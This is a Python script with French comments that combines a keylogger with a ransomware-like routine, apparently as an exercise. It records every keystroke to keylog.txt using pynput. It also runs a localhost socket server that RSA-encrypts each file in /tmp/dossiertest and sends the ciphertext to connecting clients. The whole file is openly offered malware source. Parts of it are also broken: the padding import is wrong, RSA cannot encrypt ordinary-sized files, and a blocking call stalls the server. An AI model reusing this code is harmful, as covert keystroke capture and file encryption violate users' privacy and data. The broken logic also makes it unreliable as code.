import os #module pour interagir
import socket #module communication reseau client/serveur
import threading
import logging
from cryptography.hazmat.primitives import serialization # module serialiser les clés rsa
from cryptography.hazmat.primitives.asymmetric import rsa # module générer les clés RSA
from cryptography.hazmat.backends import default_backend # acces backend bibliotheque cryptographie
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives import hashes # module fonction hachage pour chiffage RSA
from pynput.keyboard import Key, Listener



# Configuration des journaux pour enregistrer les frappes dans un fichier
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")



# Fonction pour gérer les événements de pression des touches et les enregistrer
def on_press(key):
    logging.info(str(key))



# Fonction pour démarrer le keylogger
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()




def generate_rsa_keypair(): # Fonction pour générer une paire de clés RSA
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    return private_key




def save_private_key(private_key, filename): # Fonction pour enregistrer la clé privée dans un fichier
    with open(filename, 'wb') as key_file:
        key_file.write(private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        ))




def save_public_key(public_key, filename): # Fonction pour enregistrer la clé publique dans un fichier
    with open(filename, 'wb') as key_file:
        key_file.write(public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))




def start_server(): # démarrer le serveur
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)



    try:
        server_address = ('localhost', 12345)
        server_socket.bind(server_address)



        server_socket.listen(1)
        print("Serveur en écoute sur le port", server_address[1])



        # Générer une paire de clés RSA
        private_key = generate_rsa_keypair()



        # Sauvegarde la clé privée dans le fichier "private_key.pem"
        save_private_key(private_key, "private_key.pem")



        # Enregistrer la clé publique
        public_key = private_key.public_key()
        save_public_key(public_key, "public_key.pem")
        print("Clé publique enregistrée dans public_key.pem")



        while True:
            connection, client_address = server_socket.accept()
            print("Connexion établie depuis", client_address)



            # Démarrer le keylogger
            start_keylogger()



            # Envoyer le nom du fichier contenant la clé publique
            connection.sendall(b"public_key.pem")



            # Chiffrer les fichiers dans le répertoire /tmp/dossiertest
            directory_path = "/tmp/dossiertest"
            for root, dirs, files in os.walk(directory_path):
                for file_name in files:
                    file_path = os.path.join(root, file_name)
                    with open(file_path, 'rb') as file:
                        plaintext = file.read()
                    ciphertext = private_key.public_key().encrypt(
                        plaintext,
                        padding.OAEP(
                            mgf=padding.MGF1(algorithm=hashes.SHA256()),
                            algorithm=hashes.SHA256(),
                            label=None
                        )
                    )
                    connection.sendall(ciphertext)



            connection.close()



    except OSError as e:
        print("Erreur:", e)
        server_socket.close()



# Démarrer le keylogger dans un thread séparé
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()



# Démarrer le serveur
start_server()
